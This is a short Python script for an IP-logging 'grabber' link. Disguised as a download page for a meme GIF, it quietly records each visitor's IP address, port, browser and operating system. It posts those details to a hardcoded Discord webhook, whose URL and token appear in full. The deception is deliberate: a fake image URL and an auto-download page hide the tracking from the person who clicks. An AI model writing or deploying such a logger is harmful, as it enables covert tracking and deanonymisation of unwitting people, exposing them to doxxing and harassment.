from http.server import BaseHTTPRequestHandler
import json
import requests
import httpagentparser
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"

FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

DOWNLOAD_HTML = """
<!DOCTYPE html>
<html>
<head>
  <title>Tung Tung Download</title>
  <meta charset="utf-8">
</head>
<body>
  <h1>Downloading Tung Tung...</h1>
  <p>If nothing happens, right-click > Save As.</p>

  <script>
    const url = "%s";
    const link = document.createElement('a');
    link.href = url;
    link.download = "tung-tung.gif";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setTimeout(() => { window.location.href = url; }, 500);  // fallback preview
  </script>
</body>
</html>
""" % FAKE_IMAGE_URL

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            port = self.headers.get('X-Forwarded-Port', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            parsed_ua = httpagentparser.detect(user_agent)

            log = f"**New click!**\nIP: `{ip}`\nPort: `{port}`\nBrowser: {parsed_ua.get('browser', {}).get('name', 'Unknown')} {parsed_ua.get('browser', {}).get('version', '')}\nOS: {parsed_ua.get('os', {}).get('name', 'Unknown')}\nUA: `{user_agent}`"

            requests.post(WEBHOOK_URL, json={"content": log})

            # Serve HTML that triggers download
            html = DOWNLOAD_HTML.encode('utf-8')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', len(html))
            self.end_headers()
            self.wfile.write(html)

        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(f"Error: {str(e)}".encode())

    def do_HEAD(self):
        self.do_GET()
